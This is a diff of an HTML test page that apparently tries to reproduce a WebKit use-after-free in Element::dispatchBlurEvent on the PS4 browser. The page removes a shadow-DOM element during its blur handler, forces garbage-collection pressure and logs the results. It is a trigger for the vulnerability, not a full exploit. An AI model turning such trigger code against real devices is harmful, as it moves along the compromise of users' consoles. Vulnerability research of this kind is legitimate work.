@@ -1,66 +1,837 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="utf-8">
+<title>PS4 WebKit - Element::dispatchBlurEvent UAF Test</title>
+
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: #111;
+    color: #eee;
+    margin: 20px;
+}
+
+#log {
+    white-space: pre-wrap;
+    font-family: monospace;
+    font-size: 13px;
+    background: #000;
+    border: 1px solid #444;
+    padding: 12px;
+    min-height: 360px;
+    overflow-wrap: break-word;
+}
+
+#host {
+    margin-top: 20px;
+}
+
+button {
+    font-size: 18px;
+    padding: 10px 18px;
+    margin: 5px;
+}
+
+#victim {
+    padding: 20px;
+    border: 2px solid #888;
+}
+</style>
+</head>
+
 <body>
-<p id="status">Setup...</p>
+
+<h2>PS4 WebKit Focus / Blur Test</h2>
+
+<div id="log"></div>
+
 <div id="host"></div>
-<div id="result"></div>
-<button id="btn" style="font-size:2em;padding:1em">TRIGGER (tap aqui)</button>
+
+<div id="controls">
+    <button id="startButton">START TEST</button>
+    <button id="focusButton">FOCUS VICTIM</button>
+    <button id="blurButton">BLUR VICTIM</button>
+</div>
+
 <script>
+
+"use strict";
+
+/*
+ * ============================================================
+ * PS4 WebKit / Element::dispatchBlurEvent UAF investigation
+ * ============================================================
+ *
+ * Target path from the supplied FocusController.cpp:
+ *
+ *   IsFocused -> false
+ *        |
+ *        v
+ *   setFocusedInternal(false)
+ *        |
+ *        v
+ *   dispatchEventsOnWindowAndFocusedElement(document, false)
+ *        |
+ *        v
+ *   document->focusedElement()
+ *        |
+ *        v
+ *   dispatchBlurEvent()
+ *
+ * The original WebKit test uses TestRunner/UIHelper to make
+ * the browser window lose its key/focus.
+ *
+ * This version removes those internal test-runner functions.
+ * ============================================================
+ */
+
+var logElement = document.getElementById("log");
+
+var host = document.getElementById("host");
+
+var shadowRoot = null;
+var victim = null;
+
+var blurCount = 0;
+var focusCount = 0;
+var phase = 0;
+var finished = false;
+
+
+/*
+ * ------------------------------------------------------------
+ * Logger
+ * ------------------------------------------------------------
+ */
+
+function log(message) {
+    var now = new Date();
+
+    var stamp =
+        ("0" + now.getHours()).slice(-2) + ":" +
+        ("0" + now.getMinutes()).slice(-2) + ":" +
+        ("0" + now.getSeconds()).slice(-2) + "." +
+        ("00" + now.getMilliseconds()).slice(-3);
+
+    logElement.textContent +=
+        "[" + stamp + "] " + message + "\n";
+
+    logElement.scrollTop = logElement.scrollHeight;
+}
+
+
+/*
+ * ------------------------------------------------------------
+ * GC replacement supplied for the PS4 test
+ * ------------------------------------------------------------
+ */
+
 function gc() {
+
+    log("GC: begin");
+
     function gcRec(n) {
-        if (n < 1) return {};
-        var temp = {i: "ab" + i + (i / 100000)};
+
+        if (n < 1)
+            return {};
+
+        var temp = {
+            i: "ab" + i + (i / 100000)
+        };
+
         temp += "foo";
-        gcRec(n-1);
+
+        gcRec(n - 1);
     }
+
     for (var i = 0; i < 10000; i++)
         gcRec(10);
+
+    log("GC: end");
 }
 
-function setup() {
-    let shadowRoot = host.attachShadow({ mode: 'open' });
-    let victim = document.createElement('div');
+
+/*
+ * ------------------------------------------------------------
+ * Environment information
+ * ------------------------------------------------------------
+ */
+
+function environment() {
+
+    log("========================================");
+    log("PS4 WebKit dispatchBlurEvent test");
+    log("========================================");
+
+    log("UserAgent:");
+    log(navigator.userAgent);
+
+    log("document.hasFocus(): " +
+        document.hasFocus());
+
+    log("visibilityState: " +
+        document.visibilityState);
+
+    log("hidden: " +
+        document.hidden);
+
+    log("ShadowRoot: " +
+        ("attachShadow" in Element.prototype));
+
+    log("requestAnimationFrame: " +
+        ("requestAnimationFrame" in window));
+
+    log("========================================");
+}
+
+
+/*
+ * ------------------------------------------------------------
+ * Construct original Shadow DOM configuration
+ * ------------------------------------------------------------
+ */
+
+function createVictim() {
+
+    log("");
+    log("PHASE 1");
+    log("Creating ShadowRoot...");
+
+    shadowRoot = host.attachShadow({
+        mode: "open"
+    });
+
+    log("ShadowRoot created.");
+
+    victim = document.createElement("div");
+
+    victim.id = "victim";
+
     victim.tabIndex = 0;
-    victim.textContent = 'Focusable';
+
+    victim.textContent = "Focusable";
+
+    victim.style.cssText =
+        "padding:20px;" +
+        "border:2px solid white;" +
+        "display:block;";
+
     shadowRoot.appendChild(victim);
 
-    document.addEventListener('blur', function onBlur() {
-        victim.remove();
-        victim = null;
-        gc();
-        document.removeEventListener('blur', onBlur, true);
+    log("Victim appended to ShadowRoot.");
+
+    victim.addEventListener("focus", function () {
+
+        focusCount++;
+
+        log("VICTIM focus event #" + focusCount);
+
     }, true);
 
+    victim.addEventListener("blur", function () {
+
+        blurCount++;
+
+        log("");
+        log("****************************************");
+        log("VICTIM BLUR EVENT #" + blurCount);
+        log("****************************************");
+
+        log("Inside victim blur handler.");
+
+        /*
+         * This is deliberately performed during blur,
+         * matching the critical mutation of the original test.
+         */
+
+        if (victim) {
+
+            log("Removing victim from ShadowRoot...");
+
+            try {
+                victim.remove();
+                log("victim.remove(): OK");
+            } catch (e) {
+                log("victim.remove(): EXCEPTION");
+                log(String(e));
+            }
+
+        }
+
+        /*
+         * Drop the JavaScript reference.
+         */
+
+        victim = null;
+
+        log("JavaScript victim reference cleared.");
+
+        /*
+         * Force allocation pressure after the object has
+         * been detached.
+         */
+
+        gc();
+
+        log("Blur mutation sequence completed.");
+
+    }, true);
+
+    log("Focusing victim...");
+
     victim.focus();
-    return victim;
+
+    log("victim.focus() returned.");
+
+    log("document.activeElement:");
+    log(
+        document.activeElement ?
+        document.activeElement.tagName :
+        "null"
+    );
+
+    log("ShadowRoot.activeElement:");
+
+    try {
+        log(
+            shadowRoot.activeElement ?
+            shadowRoot.activeElement.tagName :
+            "null"
+        );
+    } catch (e) {
+        log("ShadowRoot.activeElement exception: " + e);
+    }
+
+    log("Victim setup complete.");
 }
 
-setup();
-status.textContent = 'Pronto. Trigger via botão ou botão PS.';
 
-// Trigger 1: botão PS ou qualquer perda de foco do OS → automático via blur no window
-window.addEventListener('blur', () => {
-    result.textContent = 'window blur disparado';
-});
+/*
+ * ------------------------------------------------------------
+ * Window/document focus observation
+ * ------------------------------------------------------------
+ */
 
-// Trigger 2: botão na página → abre popup, o parent perde setIsKey
-btn.addEventListener('click', () => {
-    setup(); // reset se já rodou
-    
-    // Tenta popup (mais portável no WebKit)
-    let popup = window.open('about:blank', '_blank', 'width=1,height=1');
-    if (popup) {
-        popup.focus();
-        setTimeout(() => popup.close(), 500);
-    } else {
-        // Fallback: dialog de sistema rouba o foco
-        // O blur no document dispara de forma síncrona antes do alert retornar
-        setTimeout(() => alert('trigger'), 0);
+window.addEventListener("blur", function () {
+
+    log("");
+    log("WINDOW BLUR EVENT");
+
+    log("document.hasFocus(): " +
+        document.hasFocus());
+
+}, true);
+
+
+window.addEventListener("focus", function () {
+
+    log("");
+    log("WINDOW FOCUS EVENT");
+
+    log("document.hasFocus(): " +
+        document.hasFocus());
+
+}, true);
+
+
+document.addEventListener("blur", function () {
+
+    log("");
+    log("DOCUMENT CAPTURE BLUR");
+
+    log("document.hasFocus(): " +
+        document.hasFocus());
+
+    /*
+     * If the browser's internal FocusController path reaches
+     * the focused element, the victim handler above should
+     * execute during this transition.
+     */
+
+}, true);
+
+
+/*
+ * ------------------------------------------------------------
+ * Direct focus test
+ * ------------------------------------------------------------
+ */
+
+function focusVictim() {
+
+    log("");
+    log("MANUAL FOCUS REQUEST");
+
+    if (!victim) {
+
+        log("Victim reference is null.");
+
+        return;
     }
-});
 
-// Trigger 3: window.blur() direto (funciona em algumas versões do Orbis WebKit)
-// window.blur();
+    try {
+
+        victim.focus();
+
+        log("victim.focus() completed.");
+
+        log("document.hasFocus(): " +
+            document.hasFocus());
+
+    } catch (e) {
+
+        log("focus exception: " + e);
+
+    }
+}
+
+
+/*
+ * ------------------------------------------------------------
+ * Direct blur fallback
+ *
+ * This is NOT equivalent to the original UIHelper operation.
+ * It exists only as a control condition.
+ * ------------------------------------------------------------
+ */
+
+function directBlur() {
+
+    log("");
+    log("CONTROL: direct victim.blur()");
+
+    if (!victim) {
+
+        log("Victim reference is null.");
+
+        return;
+    }
+
+    try {
+
+        victim.blur();
+
+        log("victim.blur() completed.");
+
+    } catch (e) {
+
+        log("blur exception: " + e);
+
+    }
+}
+
+
+/*
+ * ------------------------------------------------------------
+ * Focus transition attempts
+ * ------------------------------------------------------------
+ */
+
+function attemptFocusTransition() {
+
+    log("");
+    log("========================================");
+    log("PHASE 2");
+    log("Attempting web-visible focus transition");
+    log("========================================");
+
+    log("Initial document.hasFocus(): " +
+        document.hasFocus());
+
+    log("Initial visibilityState: " +
+        document.visibilityState);
+
+    /*
+     * First control condition:
+     * direct blur.
+     *
+     * This tells us whether the mutation itself works,
+     * independently of the Page/ViewState transition.
+     */
+
+    log("");
+    log("CONTROL CONDITION");
+    log("Calling victim.blur() is intentionally avoided initially.");
+
+    /*
+     * Attempt to move focus away without using UIHelper.
+     */
+
+    var temporary = document.createElement("button");
+
+    temporary.id = "temporary-focus-target";
+
+    temporary.textContent = "temporary";
+
+    temporary.style.position = "fixed";
+    temporary.style.left = "-10000px";
+    temporary.style.top = "-10000px";
+
+    document.body.appendChild(temporary);
+
+    log("Temporary focus target created.");
+
+    try {
+
+        temporary.focus();
+
+        log("temporary.focus() completed.");
+
+    } catch (e) {
+
+        log("temporary.focus() exception: " + e);
+
+    }
+
+    /*
+     * Give WebCore an opportunity to process the transition.
+     */
+
+    requestAnimationFrame(function () {
+
+        setTimeout(function () {
+
+            log("");
+            log("After temporary focus transition:");
+
+            log("document.hasFocus(): " +
+                document.hasFocus());
+
+            log("document.activeElement:");
+
+            log(
+                document.activeElement ?
+                document.activeElement.tagName :
+                "null"
+            );
+
+            /*
+             * Remove the temporary focus target.
+             */
+
+            try {
+
+                temporary.remove();
+
+                log("Temporary focus target removed.");
+
+            } catch (e) {
+
+                log("Temporary target removal exception: " + e);
+
+            }
+
+            /*
+             * Allocation pressure after the transition.
+             */
+
+            gc();
+
+            log("");
+            log("PHASE 2 complete.");
+
+            /*
+             * If victim is still alive, we have not reproduced
+             * the original blur transition.
+             */
+
+            if (victim) {
+
+                log("");
+                log("Victim still exists.");
+
+                log("This indicates that the web-visible focus");
+                log("transition did not reproduce the original");
+                log("TestRunner/UIHelper window-key transition.");
+
+                runFallbackSequence();
+
+            } else {
+
+                log("");
+                log("Victim was destroyed during focus transition.");
+
+                log("Blur mutation was reached.");
+
+                finish();
+
+            }
+
+        }, 0);
+
+    });
+
+}
+
+
+/*
+ * ------------------------------------------------------------
+ * Fallback sequence
+ * ------------------------------------------------------------
+ */
+
+function runFallbackSequence() {
+
+    log("");
+    log("========================================");
+    log("PHASE 3");
+    log("Fallback control sequence");
+    log("========================================");
+
+    /*
+     * Rebuild the victim because the first sequence may have
+     * been only a control condition.
+     */
+
+    if (!victim) {
+
+        shadowRoot = host.shadowRoot;
+
+        victim = document.createElement("div");
+
+        victim.id = "victim2";
+
+        victim.tabIndex = 0;
+
+        victim.textContent = "Focusable";
+
+        shadowRoot.appendChild(victim);
+
+        log("Second victim created.");
+
+        victim.addEventListener("blur", function () {
+
+            log("");
+            log("SECOND VICTIM BLUR");
+
+            try {
+
+                victim.remove();
+
+                log("Second victim removed.");
+
+            } catch (e) {
+
+                log("Second victim remove exception: " + e);
+
+            }
+
+            victim = null;
+
+            gc();
+
+            log("Second victim reference cleared.");
+
+        }, true);
+
+    }
+
+    try {
+
+        victim.focus();
+
+        log("Second victim focused.");
+
+    } catch (e) {
+
+        log("Second victim focus exception: " + e);
+
+    }
+
+    /*
+     * Use a temporary input to force a real DOM focus change.
+     */
+
+    var input = document.createElement("input");
+
+    input.type = "text";
+
+    input.style.position = "fixed";
+    input.style.left = "-10000px";
+    input.style.top = "-10000px";
+
+    document.body.appendChild(input);
+
+    log("Temporary input created.");
+
+    setTimeout(function () {
+
+        try {
+
+            input.focus();
+
+            log("Temporary input focused.");
+
+        } catch (e) {
+
+            log("Temporary input focus exception: " + e);
+
+        }
+
+        requestAnimationFrame(function () {
+
+            setTimeout(function () {
+
+                try {
+
+                    input.remove();
+
+                } catch (e) {
+                }
+
+                gc();
+
+                log("");
+                log("PHASE 3 complete.");
+
+                if (victim) {
+
+                    log("");
+                    log("========================================");
+                    log("RESULT");
+                    log("========================================");
+
+                    log("No victim blur mutation was observed.");
+
+                    log("The JavaScript focus transition did not");
+                    log("demonstrate the internal Page/ViewState");
+                    log("window-focus transition used by the");
+                    log("original WebKit LayoutTest.");
+
+                } else {
+
+                    log("");
+                    log("========================================");
+                    log("RESULT");
+                    log("========================================");
+
+                    log("Victim was removed during blur.");
+
+                    log("The critical JavaScript mutation was reached.");
+
+                }
+
+                finish();
+
+            }, 0);
+
+        });
+
+    }, 50);
+
+}
+
+
+/*
+ * ------------------------------------------------------------
+ * Finish
+ * ------------------------------------------------------------
+ */
+
+function finish() {
+
+    if (finished)
+        return;
+
+    finished = true;
+
+    log("");
+    log("========================================");
+    log("TEST FINISHED");
+    log("========================================");
+
+    log("focus events: " + focusCount);
+    log("blur events: " + blurCount);
+
+    log("document.hasFocus(): " +
+        document.hasFocus());
+
+    log("visibilityState: " +
+        document.visibilityState);
+
+    log("========================================");
+}
+
+
+/*
+ * ------------------------------------------------------------
+ * Start
+ * ------------------------------------------------------------
+ */
+
+function startTest() {
+
+    if (phase)
+        return;
+
+    phase = 1;
+
+    environment();
+
+    createVictim();
+
+    /*
+     * Allow the initial focus operation to settle.
+     */
+
+    requestAnimationFrame(function () {
+
+        setTimeout(function () {
+
+            attemptFocusTransition();
+
+        }, 100);
+
+    });
+
+}
+
+
+/*
+ * ------------------------------------------------------------
+ * Buttons
+ * ------------------------------------------------------------
+ */
+
+document.getElementById("startButton")
+    .addEventListener("click", function () {
+
+        startTest();
+
+    });
+
+
+document.getElementById("focusButton")
+    .addEventListener("click", function () {
+
+        focusVictim();
+
+    });
+
+
+document.getElementById("blurButton")
+    .addEventListener("click", function () {
+
+        directBlur();
+
+    });
+
+
+/*
+ * Automatically prepare the test, but require the user to
+ * explicitly start the focus-transition portion.
+ */
+
+log("READY");
+log("Create/focus scenario is prepared by START TEST.");
+log("No TestRunner APIs are used.");
+log("No UIHelper APIs are used.");
+log("No GCController is used.");
+log("No localStorage is used.");
+
 </script>
+
 </body>
 </html>
+
